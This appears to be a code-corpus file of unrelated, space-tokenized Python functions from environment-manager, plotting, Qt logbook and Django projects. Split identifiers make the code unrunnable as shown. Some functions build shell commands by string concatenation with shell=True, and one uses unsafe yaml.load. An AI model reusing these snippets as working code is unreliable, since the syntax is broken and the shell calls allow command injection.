def clone ( self , repo path , destination , branch = None ) : logger . debug ( 'Installing ' + repo path ) if not destination . startswith ( self . env path ) : destination = unipath ( self . env path , destination ) if branch : return shell . run ( 'git' , 'clone' , repo path , '--branch' , branch , '--single-branch' , '--recursive' , destination ) return shell . run ( 'git' , 'clone' , '--recursive' , repo path , destination )
def pull ( self , repo path , * args ) : logger . debug ( 'Pulling ' + repo path ) if not repo path . startswith ( self . env path ) : repo path = unipath ( self . env path , repo path ) return shell . run ( 'git' , 'pull' , * args , * * { 'cwd' : repo path } )
def install ( self , package ) : logger . debug ( 'Installing ' + package ) shell . run ( self . pip path , 'install' , package )
def upgrade ( self , package ) : logger . debug ( 'Upgrading ' + package ) shell . run ( self . pip path , 'install' , '--upgrade' , '--no-deps' , package ) shell . run ( self . pip path , 'install' , package )
def df quantile ( df , nb = 100 ) : quantiles = np . linspace ( 0 , 1. , nb ) res = pd . Data Frame ( ) for q in quantiles : res = res . append ( df . quantile ( q ) , ignore index = True ) return res
def rmse ( a , b ) : return np . sqrt ( np . square ( a - b ) . mean ( ) )
def nmse ( a , b ) : return np . square ( a - b ) . mean ( ) / ( a . mean ( ) * b . mean ( ) )
def mfbe ( a , b ) : return 2 * bias ( a , b ) / ( a . mean ( ) + b . mean ( ) )
def foex ( a , b ) : return ( np . sum ( a > b , dtype = float ) / len ( a ) - 0.5 ) * 100
def fmt ( a , b ) : return 100 * np . min ( [ a , b ] , axis = 0 ) . sum ( ) / np . max ( [ a , b ] , axis = 0 ) . sum ( )
def site path ( self ) : if platform == 'win' : return unipath ( self . path , 'Lib' , 'site-packages' ) py ver = 'python{0}' . format ( sys . version [ : 3 ] ) return unipath ( self . path , 'lib' , py ver , 'site-packages' )
def command ( self ) : cmd = self . config . get ( 'command' , None ) if cmd is None : return cmd = cmd [ platform ] return cmd [ 'path' ] , cmd [ 'args' ]
def get modules ( ) : modules = set ( ) cwd = os . getcwd ( ) for d in os . listdir ( cwd ) : if d == 'module.yml' : modules . add ( Module ( cwd ) ) path = unipath ( cwd , d ) if utils . is module ( path ) : modules . add ( Module ( cwd ) ) module paths = get module paths ( ) for module path in module paths : for d in os . listdir ( module path ) : path = unipath ( module path , d ) if utils . is module ( path ) : modules . add ( Module ( path ) ) return sorted ( list ( modules ) , key = lambda x : x . name )
def add active module ( module ) : modules = set ( get active modules ( ) ) modules . add ( module ) new modules path = os . pathsep . join ( [ m . path for m in modules ] ) os . environ [ 'CPENV ACTIVE MODULES' ] = str ( new modules path )
def rem active module ( module ) : modules = set ( get active modules ( ) ) modules . discard ( module ) new modules path = os . pathsep . join ( [ m . path for m in modules ] ) os . environ [ 'CPENV ACTIVE MODULES' ] = str ( new modules path )
def format objects ( objects , children = False , columns = None , header = True ) : columns = columns or ( 'NAME' , 'TYPE' , 'PATH' ) objects = sorted ( objects , key = type and name ) data = [ ] for obj in objects : if isinstance ( obj , cpenv . Virtual Environment ) : data . append ( get info ( obj ) ) modules = obj . get modules ( ) if children and modules : for mod in modules : data . append ( get info ( mod , indent = 2 , root = obj . path ) ) else : data . append ( get info ( obj ) ) maxes = [ len ( max ( col , key = len ) ) for col in zip ( * data ) ] tmpl = '{:%d}  {:%d}  {:%d}' % tuple ( maxes ) lines = [ ] if header : lines . append ( '\n' + bold blue ( tmpl . format ( * columns ) ) ) for obj data in data : lines . append ( tmpl . format ( * obj data ) ) return '\n' . join ( lines )
def list ( ) : environments = cpenv . get environments ( ) modules = cpenv . get modules ( ) click . echo ( format objects ( environments + modules , children = True ) )
def create ( name or path , config ) : if not name or path : ctx = click . get current context ( ) click . echo ( ctx . get help ( ) ) examples = ( '\n Examples:\n' '    cpenv create my env\n' '    cpenv create ./relative/path/to/my env\n' '    cpenv create my env --config ./relative/path/to/config\n' '    cpenv create my env --config git@github.com:user/config.git\n' ) click . echo ( examples ) return click . echo ( blue ( 'Creating a new virtual environment ' + name or path ) ) try : env = cpenv . create ( name or path , config ) except Exception as e : click . echo ( bold red ( 'FAILED TO CREATE ENVIRONMENT!' ) ) click . echo ( e ) else : click . echo ( bold green ( 'Successfully created environment!' ) ) click . echo ( blue ( 'Launching subshell' ) ) cpenv . activate ( env ) shell . launch ( env . name )
def list ( ) : click . echo ( 'Cached Environments' ) environments = list ( Environment Cache ) click . echo ( format objects ( environments , children = False ) )
def localize ( name ) : env = cpenv . get active env ( ) if not env : click . echo ( 'You need to activate an environment first.' ) return try : r = cpenv . resolve ( name ) except cpenv . Resolve Error as e : click . echo ( '\n' + str ( e ) ) module = r . resolved [ 0 ] if isinstance ( module , cpenv . Virtual Environment ) : click . echo ( '\n Can only localize a module not an environment' ) return active modules = cpenv . get active modules ( ) if module in active modules : click . echo ( '\n Can not localize an active module.' ) return if module in env . get modules ( ) : click . echo ( '\n{} is already local to {}' . format ( module . name , env . name ) ) return if click . confirm ( '\n Add {} to env {}?' . format ( module . name , env . name ) ) : click . echo ( 'Adding module...' , nl = False ) try : module = env . add module ( module . name , module . path ) except : click . echo ( bold red ( 'FAILED' ) ) raise else : click . echo ( bold green ( 'OK!' ) ) click . echo ( '\n Activate the localize module:' ) click . echo ( '    cpenv activate {} {}' . format ( env . name , module . name ) )
def path resolver ( resolver , path ) : path = unipath ( path ) if is environment ( path ) : return Virtual Environment ( path ) raise Resolve Error
def home resolver ( resolver , path ) : from . api import get home path path = unipath ( get home path ( ) , path ) if is environment ( path ) : return Virtual Environment ( path ) raise Resolve Error
def cache resolver ( resolver , path ) : env = resolver . cache . find ( path ) if env : return env raise Resolve Error
def module resolver ( resolver , path ) : if resolver . resolved : if isinstance ( resolver . resolved [ 0 ] , Virtual Environment ) : env = resolver . resolved [ 0 ] mod = env . get module ( path ) if mod : return mod raise Resolve Error
def active env module resolver ( resolver , path ) : from . api import get active env env = get active env ( ) if not env : raise Resolve Error mod = env . get module ( path ) if not mod : raise Resolve Error return mod
def broadcast shape ( * args ) : #TODO: currently incorrect result if a Sequence is provided as an input shapes = [ a . shape if hasattr ( type ( a ) , ' array interface ' ) else ( ) for a in args ] ndim = max ( len ( sh ) for sh in shapes ) # new common ndim after broadcasting for i , sh in enumerate ( shapes ) : if len ( sh ) < ndim : shapes [ i ] = ( 1 , ) * ( ndim - len ( sh ) ) + sh return tuple ( max ( sh [ ax ] for sh in shapes ) for ax in range ( ndim ) )
def run ( * args , * * kwargs ) : kwargs . setdefault ( 'env' , os . environ ) kwargs . setdefault ( 'shell' , True ) try : subprocess . check call ( ' ' . join ( args ) , * * kwargs ) return True except subprocess . Called Process Error : logger . debug ( 'Error running: {}' . format ( args ) ) return False
def cmd ( ) : if platform == 'win' : return [ 'cmd.exe' , '/K' ] elif platform == 'linux' : ppid = os . getppid ( ) ppid cmdline file = '/proc/{0}/cmdline' . format ( ppid ) try : with open ( ppid cmdline file ) as f : cmd = f . read ( ) if cmd . endswith ( '\x00' ) : cmd = cmd [ : - 1 ] cmd = cmd . split ( '\x00' ) return cmd + [ binpath ( 'subshell.sh' ) ] except : cmd = 'bash' else : cmd = 'bash' return [ cmd , binpath ( 'subshell.sh' ) ]
def run global hook ( hook name , * args ) : hook finder = Hook Finder ( get global hook path ( ) ) hook = hook finder ( hook name ) if hook : hook . run ( * args )
def validate ( self ) : for env in list ( self ) : if not env . exists : self . remove ( env )
def load ( self ) : if not os . path . exists ( self . path ) : return with open ( self . path , 'r' ) as f : env data = yaml . load ( f . read ( ) ) if env data : for env in env data : self . add ( Virtual Environment ( env [ 'root' ] ) )
def save ( self ) : env data = [ dict ( name = env . name , root = env . path ) for env in self ] encode = yaml . safe dump ( env data , default flow style = False ) with open ( self . path , 'w' ) as f : f . write ( encode )
def gather ( obj ) : if hasattr ( obj , ' distob gather ' ) : return obj . distob gather ( ) elif ( isinstance ( obj , collections . Sequence ) and not isinstance ( obj , string types ) ) : return [ gather ( subobj ) for subobj in obj ] else : return obj
def apply ( f , obj , * args , * * kwargs ) : return vectorize ( f ) ( obj , * args , * * kwargs )
def is git repo ( path ) : if path . startswith ( 'git@' ) or path . startswith ( 'https://' ) : return True if os . path . exists ( unipath ( path , '.git' ) ) : return True return False
def is home environment ( path ) : home = unipath ( os . environ . get ( 'CPENV HOME' , '~/.cpenv' ) ) path = unipath ( path ) return path . startswith ( home )
def is redirecting ( path ) : candidate = unipath ( path , '.cpenv' ) return os . path . exists ( candidate ) and os . path . isfile ( candidate )
def redirect to env paths ( path ) : with open ( path , 'r' ) as f : redirected = f . read ( ) return shlex . split ( redirected )
def expandpath ( path ) : return os . path . abspath ( os . path . expandvars ( os . path . expanduser ( path ) ) )
def unipath ( * paths ) : return os . path . normpath ( expandpath ( os . path . join ( * paths ) ) )
def binpath ( * paths ) : package root = os . path . dirname ( file ) return os . path . normpath ( os . path . join ( package root , 'bin' , * paths ) )
def ensure path exists ( path , * args ) : if os . path . exists ( path ) : return os . makedirs ( path , * args )
def walk up ( start dir , depth = 20 ) : root = start dir for i in xrange ( depth ) : contents = os . listdir ( root ) subdirs , files = [ ] , [ ] for f in contents : if os . path . isdir ( os . path . join ( root , f ) ) : subdirs . append ( f ) else : files . append ( f ) yield root , subdirs , files parent = os . path . dirname ( root ) if parent and not parent == root : root = parent else : break
def join seq ( d , k , v ) : if k not in d : d [ k ] = list ( v ) elif isinstance ( d [ k ] , list ) : for item in v : if item not in d [ k ] : d [ k ] . insert ( 0 , item ) elif isinstance ( d [ k ] , string types ) : v . append ( d [ k ] ) d [ k ] = v
def join dicts ( * dicts ) : out dict = { } for d in dicts : for k , v in d . iteritems ( ) : if not type ( v ) in JOINERS : raise Key Error ( 'Invalid type in dict: {}' . format ( type ( v ) ) ) JOINERS [ type ( v ) ] ( out dict , k , v ) return out dict
def get store env tmp ( ) : tempdir = tempfile . gettempdir ( ) temp name = 'envstore{0:0>3d}' temp path = unipath ( tempdir , temp name . format ( random . getrandbits ( 9 ) ) ) if not os . path . exists ( temp path ) : return temp path else : return get store env tmp ( )
def upstream url ( self , uri ) : return self . application . options . upstream + self . request . uri
def make upstream request ( self ) : url = self . upstream url ( self . request . uri ) return tornado . httpclient . HTTP Request ( url , method = self . request . method , headers = self . request . headers , body = self . request . body if self . request . body else None )
def k ion ( self , E ) : return self . n p * np . power ( spc . e , 2 ) / ( 2 * sltr . Ge V2joule ( E ) * spc . epsilon 0 )
def paginate update ( update ) : from happenings . models import Update time = update . pub time event = update . event try : next = Update . objects . filter ( event = event , pub time gt = time ) . order by ( 'pub time' ) . only ( 'title' ) [ 0 ] except : next = None try : previous = Update . objects . filter ( event = event , pub time lt = time ) . order by ( '-pub time' ) . only ( 'title' ) [ 0 ] except : previous = None return { 'next' : next , 'previous' : previous , 'event' : event }
def settings and attributes ( self ) : attrs = self . setting values ( ) attrs . update ( self . dict ) skip = [ " instance settings" , "aliases" ] for a in skip : del attrs [ a ] return attrs
def get reference to class ( cls , class or class name ) : if isinstance ( class or class name , type ) : return class or class name elif isinstance ( class or class name , string types ) : if ":" in class or class name : mod name , class name = class or class name . split ( ":" ) if not mod name in sys . modules : import ( mod name ) mod = sys . modules [ mod name ] return mod . dict [ class name ] else : return cls . load class from locals ( class or class name ) else : msg = "Unexpected Type '%s'" % type ( class or class name ) raise Internal Cashew Exception ( msg )
def check docstring ( cls ) : docstring = inspect . getdoc ( cls ) if not docstring : breadcrumbs = " -> " . join ( t . name for t in inspect . getmro ( cls ) [ : - 1 ] [ : : - 1 ] ) msg = "docstring required for plugin '%s' (%s, defined in %s)" args = ( cls . name , breadcrumbs , cls . module ) raise Internal Cashew Exception ( msg % args ) max line length = cls . class settings . get ( 'max-docstring-length' ) if max line length : for i , line in enumerate ( docstring . splitlines ( ) ) : if len ( line ) > max line length : msg = "docstring line %s of %s is %s chars too long" args = ( i , cls . name , len ( line ) - max line length ) raise Exception ( msg % args ) return docstring
def resource Path ( self , relative path ) : from os import path import sys try : # Py Installer creates a temp folder and stores path in  MEIPASS base path = sys . MEIPASS except Exception : base path = path . dirname ( path . abspath ( file ) ) return path . join ( base path , relative path )
def add Logbook ( self , phys Def = "LCLS" , mcc Def = "MCC" , initial Instance = False ) : if self . log Menu Count < 5 : self . log Menus . append ( Log Select Menu ( self . logui . multi Log Layout , initial Instance ) ) self . log Menus [ - 1 ] . add Logbooks ( self . log Type List [ 1 ] , self . physics programs , phys Def ) self . log Menus [ - 1 ] . add Logbooks ( self . log Type List [ 0 ] , self . mcc programs , mcc Def ) self . log Menus [ - 1 ] . show ( ) self . log Menu Count += 1 if initial Instance : # Initial logbook menu can add additional menus, all others can only remove themselves. Q Object . connect ( self . log Menus [ - 1 ] . log Button , SIGNAL ( "clicked()" ) , self . add Logbook ) else : from functools import partial Q Object . connect ( self . log Menus [ - 1 ] . log Button , SIGNAL ( "clicked()" ) , partial ( self . remove Logbook , self . log Menus [ - 1 ] ) )
def remove Logbook ( self , menu = None ) : if self . log Menu Count > 1 and menu is not None : menu . remove Menu ( ) self . log Menus . remove ( menu ) self . log Menu Count -= 1
def selected Logs ( self ) : mcclogs = [ ] physlogs = [ ] for i in range ( len ( self . log Menus ) ) : log Type = self . log Menus [ i ] . selected Type ( ) log = self . log Menus [ i ] . selected Program ( ) if log Type == "MCC" : if log not in mcclogs : mcclogs . append ( log ) elif log Type == "Physics" : if log not in physlogs : physlogs . append ( log ) return mcclogs , physlogs
def accepted User ( self , log Type ) : from urllib2 import urlopen , URL Error , HTTP Error import json is Approved = False user Name = str ( self . logui . user Name . text ( ) ) if user Name == "" : return False # Must have a user name to submit entry if log Type == "MCC" : network Fault = False data = [ ] log url = "https://mccelog.slac.stanford.edu/elog/dev/mgibbs/dev json user list.php/?username=" + user Name try : data = urlopen ( log url , None , 5 ) . read ( ) data = json . loads ( data ) except URL Error as error : print ( "URL Error: " + str ( error . reason ) ) network Fault = True except HTTP Error as error : print ( "HTTP Error: " + str ( error . reason ) ) network Fault = True # If network fails, ask user to verify if network Fault : msg Box = Q Message Box ( ) msg Box . set Text ( "Cannot connect to MCC Log Server!" ) msg Box . set Informative Text ( "Use entered User name anyway?" ) msg Box . set Standard Buttons ( Q Message Box . Ok | Q Message Box . Cancel ) msg Box . set Default Button ( Q Message Box . Ok ) if msg Box . exec ( ) == Q Message Box . Ok : is Approved = True if data != [ ] and ( data is not None ) : is Approved = True else : is Approved = True return is Approved
def xml Setup ( self , log Type , log List ) : from xml . etree . Element Tree import Element , Sub Element , Element Tree from datetime import datetime curr time = datetime . now ( ) if log Type == "MCC" : # Set up xml tags log entry = Element ( 'log entry' ) title = Sub Element ( log entry , 'title' ) program = Sub Element ( log entry , 'program' ) timestamp = Sub Element ( log entry , 'timestamp' ) priority = Sub Element ( log entry , 'priority' ) os user = Sub Element ( log entry , 'os user' ) hostname = Sub Element ( log entry , 'hostname' ) text = Sub Element ( log entry , 'text' ) log user = Sub Element ( log entry , 'log user' ) # Check for multiple logbooks and parse into seperate tags logbook = [ ] for i in range ( len ( log List ) ) : logbook . append ( Sub Element ( log entry , 'logbook' ) ) logbook [ i ] . text = log List [ i ] . lower ( ) # Take care of dummy, unchanging tags first log entry . attrib [ 'type' ] = "LOGENTRY" program . text = "152" priority . text = "NORMAL" os user . text = "nobody" hostname . text = "mccelog" text . attrib [ 'type' ] = "text/plain" # Handle attachment if image exists if not self . image Pixmap . is Null ( ) : attachment = Sub Element ( log entry , 'attachment' ) attachment . attrib [ 'name' ] = "Figure 1" attachment . attrib [ 'type' ] = "image/" + self . image Type attachment . text = curr time . strftime ( "%Y%m%d %H%M%S " ) + str ( curr time . microsecond ) + "." + self . image Type # Set timestamp format timestamp . text = curr time . strftime ( "%Y/%m/%d %H:%M:%S" ) file Name = "/tmp/" + curr time . strftime ( "%Y%m%d %H%M%S " ) + str ( curr time . microsecond ) + ".xml" else : # If using Physics logbook time String = curr time . strftime ( "%Y-%m-%d T%H:%M:%S" ) # Set up xml tags log entry = Element ( None ) severity = Sub Element ( log entry , 'severity' ) location = Sub Element ( log entry , 'location' ) keywords = Sub Element ( log entry , 'keywords' ) time = Sub Element ( log entry , 'time' ) isodate = Sub Element ( log entry , 'isodate' ) log user = Sub Element ( log entry , 'author' ) category = Sub Element ( log entry , 'category' ) title = Sub Element ( log entry , 'title' ) metainfo = Sub Element ( log entry , 'metainfo' ) # Handle attachment if image exists if not self . image Pixmap . is Null ( ) : image File = Sub Element ( log entry , 'link' ) image File . text = time String + "-00." + self . image Type thumbnail = Sub Element ( log entry , 'file' ) thumbnail . text = time String + "-00.png" text = Sub Element ( log entry , 'text' ) # Logbook expects Text tag to come last (for some strange reason) # Take care of dummy, unchanging tags first log entry . attrib [ 'type' ] = "LOGENTRY" category . text = "USERLOG" location . text = "not set" severity . text = "NONE" keywords . text = "none" time . text = curr time . strftime ( "%H:%M:%S" ) isodate . text = curr time . strftime ( "%Y-%m-%d" ) metainfo . text = time String + "-00.xml" file Name = "/tmp/" + metainfo . text # Fill in user inputs log user . text = str ( self . logui . user Name . text ( ) ) title . text = str ( self . logui . title Entry . text ( ) ) if title . text == "" : Q Message Box ( ) . warning ( self , "No Title entered" , "Please enter a title for the entry..." ) return None text . text = str ( self . logui . text Entry . to Plain Text ( ) ) # If text field is truly empty, Element Tree leaves off tag entirely which causes logbook parser to fail if text . text == "" : text . text = " " # Create xml file xml File = open ( file Name , "w" ) if log Type == "MCC" : Element Tree ( log entry ) . write ( xml File ) else : xml String = self . prettify ( log entry ) xml File . write ( xml String ) xml File . write ( "\n" ) # Close with newline so cron job parses correctly xml File . close ( ) return file Name . rstrip ( ".xml" )
def prettify ( self , elem ) : from xml . etree import Element Tree from re import sub raw String = Element Tree . tostring ( elem , 'utf-8' ) parsed String = sub ( r'(?=<[^/].*>)' , '\n' , raw String ) # Adds newline after each closing tag return parsed String [ 1 : ]
def prepare Images ( self , file Name , log Type ) : import subprocess if self . image Type == "png" : self . image Pixmap . save ( file Name + ".png" , "PNG" , - 1 ) if log Type == "Physics" : make Post Script = "convert " + file Name + ".png " + file Name + ".ps" process = subprocess . Popen ( make Post Script , shell = True ) process . wait ( ) thumbnail Pixmap = self . image Pixmap . scaled ( 500 , 450 , Qt . Keep Aspect Ratio ) thumbnail Pixmap . save ( file Name + ".png" , "PNG" , - 1 ) else : rename Image = "cp " + self . image + " " + file Name + ".gif" process = subprocess . Popen ( rename Image , shell = True ) process . wait ( ) if log Type == "Physics" : thumbnail Pixmap = self . image Pixmap . scaled ( 500 , 450 , Qt . Keep Aspect Ratio ) thumbnail Pixmap . save ( file Name + ".png" , "PNG" , - 1 )
def submit Entry ( self ) : # log Type = self.logui.log Type.current Text() mcclogs , physlogs = self . selected Logs ( ) success = True if mcclogs != [ ] : if not self . accepted User ( "MCC" ) : Q Message Box ( ) . warning ( self , "Invalid User" , "Please enter a valid user name!" ) return file Name = self . xml Setup ( "MCC" , mcclogs ) if file Name is None : return if not self . image Pixmap . is Null ( ) : self . prepare Images ( file Name , "MCC" ) success = self . send To Logbook ( file Name , "MCC" ) if physlogs != [ ] : for i in range ( len ( physlogs ) ) : file Name = self . xml Setup ( "Physics" , physlogs [ i ] ) if file Name is None : return if not self . image Pixmap . is Null ( ) : self . prepare Images ( file Name , "Physics" ) success phys = self . send To Logbook ( file Name , "Physics" , physlogs [ i ] ) success = success and success phys self . done ( success )
def send To Logbook ( self , file Name , log Type , location = None ) : import subprocess success = True if log Type == "MCC" : file String = "" if not self . image Pixmap . is Null ( ) : file String = file Name + "." + self . image Type logcmd = "xml2elog " + file Name + ".xml " + file String process = subprocess . Popen ( logcmd , shell = True ) process . wait ( ) if process . returncode != 0 : success = False else : from shutil import copy path = "/u1/" + location . lower ( ) + "/physics/logbook/data/" # Prod path # path = "/home/softegr/alverson/log test/"  # Dev path try : if not self . image Pixmap . is Null ( ) : copy ( file Name + ".png" , path ) if self . image Type == "png" : copy ( file Name + ".ps" , path ) else : copy ( file Name + "." + self . image Type , path ) # Copy .xml file last to ensure images will be picked up by cron job # print("Copying file " + file Name + " to path " + path) copy ( file Name + ".xml" , path ) except IO Error as error : print ( error ) success = False return success
def setup UI ( self ) : label Size Policy = Q Size Policy ( Q Size Policy . Fixed , Q Size Policy . Fixed ) label Size Policy . set Horizontal Stretch ( 0 ) label Size Policy . set Vertical Stretch ( 0 ) menu Size Policy = Q Size Policy ( Q Size Policy . Expanding , Q Size Policy . Fixed ) menu Size Policy . set Horizontal Stretch ( 0 ) menu Size Policy . set Vertical Stretch ( 0 ) log Type Layout = QH Box Layout ( ) log Type Layout . set Spacing ( 0 ) type Label = Q Label ( "Log Type:" ) type Label . set Minimum Size ( Q Size ( 65 , 0 ) ) type Label . set Maximum Size ( Q Size ( 65 , 16777215 ) ) type Label . set Size Policy ( label Size Policy ) log Type Layout . add Widget ( type Label ) self . log Type = Q Combo Box ( self ) self . log Type . set Minimum Size ( Q Size ( 100 , 0 ) ) self . log Type . set Maximum Size ( Q Size ( 150 , 16777215 ) ) menu Size Policy . set Height For Width ( self . log Type . size Policy ( ) . has Height For Width ( ) ) self . log Type . set Size Policy ( menu Size Policy ) log Type Layout . add Widget ( self . log Type ) log Type Layout . set Stretch ( 1 , 6 ) program Layout = QH Box Layout ( ) program Layout . set Spacing ( 0 ) program Label = Q Label ( "Program:" ) program Label . set Minimum Size ( Q Size ( 60 , 0 ) ) program Label . set Maximum Size ( Q Size ( 60 , 16777215 ) ) program Label . set Size Policy ( label Size Policy ) program Layout . add Widget ( program Label ) self . program Name = Q Combo Box ( self ) self . program Name . set Minimum Size ( Q Size ( 100 , 0 ) ) self . program Name . set Maximum Size ( Q Size ( 150 , 16777215 ) ) menu Size Policy . set Height For Width ( self . program Name . size Policy ( ) . has Height For Width ( ) ) self . program Name . set Size Policy ( menu Size Policy ) program Layout . add Widget ( self . program Name ) program Layout . set Stretch ( 1 , 6 ) # Initial instance allows adding additional menus, all following menus can only remove themselves. if self . initial Instance : self . log Button = Q Push Button ( "+" , self ) self . log Button . set Tool Tip ( "Add logbook" ) else : self . log Button = Q Push Button ( "-" ) self . log Button . set Tool Tip ( "Remove logbook" ) self . log Button . set Minimum Size ( Q Size ( 16 , 16 ) ) # 24x24 self . log Button . set Maximum Size ( Q Size ( 16 , 16 ) ) # 24x24 self . log Button . set Object Name ( "round Button" ) # self.log Button.set Auto Fill Background(True) # region = Q Region(Q Rect(self.log Button.x()+15, self.log Button.y()+14, 20, 20), Q Region.Ellipse) # self.log Button.set Mask(region) self . log Button . set Style Sheet ( "Q Push Button {border-radius: 8px;}" ) self . log Select Layout = QH Box Layout ( ) self . log Select Layout . set Spacing ( 6 ) self . log Select Layout . add Layout ( log Type Layout ) self . log Select Layout . add Layout ( program Layout ) self . log Select Layout . add Widget ( self . log Button ) self . log Select Layout . set Stretch ( 0 , 6 ) self . log Select Layout . set Stretch ( 1 , 6 )
def show ( self ) : self . parent . add Layout ( self . log Select Layout ) self . menu Count += 1 self . connect Slots ( )
def add Logbooks ( self , type = None , logs = [ ] , default = "" ) : if type is not None and len ( logs ) != 0 : if type in self . log List : for logbook in logs : if logbook not in self . log List . get ( type ) [ 0 ] : # print("Adding log " + " to " + type + " log type.") self . log List . get ( type ) [ 0 ] . append ( logbook ) else : # print("Adding log type: " + type) self . log List [ type ] = [ ] self . log List [ type ] . append ( logs ) # If default given, auto-select upon menu creation if len ( self . log List [ type ] ) > 1 and default != "" : self . log List . get ( type ) [ 1 ] == default else : self . log List . get ( type ) . append ( default ) self . log Type . clear ( ) self . log Type . add Items ( list ( self . log List . keys ( ) ) ) self . change Log Type ( )
def remove Logbooks ( self , type = None , logs = [ ] ) : if type is not None and type in self . log List : if len ( logs ) == 0 or logs == "All" : del self . log List [ type ] else : for logbook in logs : if logbook in self . log List [ type ] : self . log List [ type ] . remove ( logbook ) self . change Log Type ( )
def change Log Type ( self ) : log Type = self . selected Type ( ) programs = self . log List . get ( log Type ) [ 0 ] default = self . log List . get ( log Type ) [ 1 ] if log Type in self . log List : self . program Name . clear ( ) self . program Name . add Items ( programs ) self . program Name . set Current Index ( programs . index ( default ) )
def add Menu ( self ) : self . parent . multi Log Layout . add Layout ( self . log Select Layout ) self . get Programs ( log Type , program Name )
def remove Layout ( self , layout ) : for cnt in reversed ( range ( layout . count ( ) ) ) : item = layout . take At ( cnt ) widget = item . widget ( ) if widget is not None : widget . delete Later ( ) else : '''If sublayout encountered, iterate recursively.''' self . remove Layout ( item . layout ( ) )
def addlabel ( ax = None , toplabel = None , xlabel = None , ylabel = None , zlabel = None , clabel = None , cb = None , windowlabel = None , fig = None , axes = None ) : if ( axes is None ) and ( ax is not None ) : axes = ax if ( windowlabel is not None ) and ( fig is not None ) : fig . canvas . set window title ( windowlabel ) if fig is None : fig = plt . gcf ( ) if fig is not None and axes is None : axes = fig . get axes ( ) if axes == [ ] : logger . error ( 'No axes found!' ) if axes is not None : if toplabel is not None : axes . set title ( toplabel ) if xlabel is not None : axes . set xlabel ( xlabel ) if ylabel is not None : axes . set ylabel ( ylabel ) if zlabel is not None : axes . set zlabel ( zlabel ) if ( clabel is not None ) or ( cb is not None ) : if ( clabel is not None ) and ( cb is not None ) : cb . set label ( clabel ) else : if clabel is None : logger . error ( 'Missing colorbar label' ) else : logger . error ( 'Missing colorbar instance' )
def linkcode resolve ( domain , info ) : if domain != 'py' : return None modname = info [ 'module' ] fullname = info [ 'fullname' ] submod = sys . modules . get ( modname ) if submod is None : return None obj = submod for part in fullname . split ( '.' ) : try : obj = getattr ( obj , part ) except : return None try : fn = inspect . getsourcefile ( obj ) except : fn = None if not fn : return None try : source , lineno = inspect . getsourcelines ( obj ) except : lineno = None if lineno : linespec = "#L%d-L%d" % ( lineno , lineno + len ( source ) - 1 ) else : linespec = "" fn = relpath ( fn , start = dirname ( scisalt . file ) ) if 'dev' in scisalt . version : return "http://github.com/joelfrederico/Sci Salt/blob/master/scisalt/%s%s" % ( fn , linespec ) else : return "http://github.com/joelfrederico/Sci Salt/blob/v%s/scisalt/%s%s" % ( scisalt . version , fn , linespec )
def syncdb ( args ) : cmd = args and 'syncdb %s' % ' ' . join ( options . args ) or 'syncdb --noinput' call manage ( cmd ) for fixture in options . paved . django . syncdb . fixtures : call manage ( "loaddata %s" % fixture )
def schema ( args ) : try : import south cmd = args and 'schemamigration %s' % ' ' . join ( options . args ) or 'schemamigration' call manage ( cmd ) except Import Error : error ( 'Could not import south.' )
def start again message ( self , message = None ) : logging . debug ( "Start again message delivered: {}" . format ( message ) ) the answer = ', ' . join ( [ str ( d ) for d in self . game . answer ] [ : - 1 ] ) + ', and ' + [ str ( d ) for d in self . game . answer ] [ - 1 ] return "{0}{1} The correct answer was {2}. Please start a new game." . format ( message , "." if message [ - 1 ] not in [ "." , "," , ";" , ":" , "!" ] else "" , the answer )
def showfig ( fig , aspect = "auto" ) : ax = fig . gca ( ) # Swap y axis if needed alim = list ( ax . axis ( ) ) if alim [ 3 ] < alim [ 2 ] : temp = alim [ 2 ] alim [ 2 ] = alim [ 3 ] alim [ 3 ] = temp ax . axis ( alim ) ax . set aspect ( aspect ) fig . show ( )
def cmd init push to cloud ( args ) : ( lcat , ccat ) = ( args . local catalog , args . cloud catalog ) logging . info ( "[init-push-to-cloud]: %s => %s" % ( lcat , ccat ) ) if not isfile ( lcat ) : args . error ( "[init-push-to-cloud] The local catalog does not exist: %s" % lcat ) if isfile ( ccat ) : args . error ( "[init-push-to-cloud] The cloud catalog already exist: %s" % ccat ) ( lmeta , cmeta ) = ( "%s.lrcloud" % lcat , "%s.lrcloud" % ccat ) if isfile ( lmeta ) : args . error ( "[init-push-to-cloud] The local meta-data already exist: %s" % lmeta ) if isfile ( cmeta ) : args . error ( "[init-push-to-cloud] The cloud meta-data already exist: %s" % cmeta ) #Let's "lock" the local catalog logging . info ( "Locking local catalog: %s" % ( lcat ) ) if not lock file ( lcat ) : raise Runtime Error ( "The catalog %s is locked!" % lcat ) #Copy catalog from local to cloud, which becomes the new "base" changeset util . copy ( lcat , ccat ) # Write meta-data both to local and cloud mfile = Meta File ( lmeta ) utcnow = datetime . utcnow ( ) . strftime ( DATETIME FORMAT ) [ : - 4 ] mfile [ 'catalog' ] [ 'hash' ] = hashsum ( lcat ) mfile [ 'catalog' ] [ 'modification utc' ] = utcnow mfile [ 'catalog' ] [ 'filename' ] = lcat mfile [ 'last push' ] [ 'filename' ] = ccat mfile [ 'last push' ] [ 'hash' ] = hashsum ( lcat ) mfile [ 'last push' ] [ 'modification utc' ] = utcnow mfile . flush ( ) mfile = Meta File ( cmeta ) mfile [ 'changeset' ] [ 'is base' ] = True mfile [ 'changeset' ] [ 'hash' ] = hashsum ( lcat ) mfile [ 'changeset' ] [ 'modification utc' ] = utcnow mfile [ 'changeset' ] [ 'filename' ] = basename ( ccat ) mfile . flush ( ) #Let's copy Smart Previews if not args . no smart previews : copy smart previews ( lcat , ccat , local2cloud = True ) #Finally,let's unlock the catalog files logging . info ( "Unlocking local catalog: %s" % ( lcat ) ) unlock file ( lcat ) logging . info ( "[init-push-to-cloud]: Success!" )
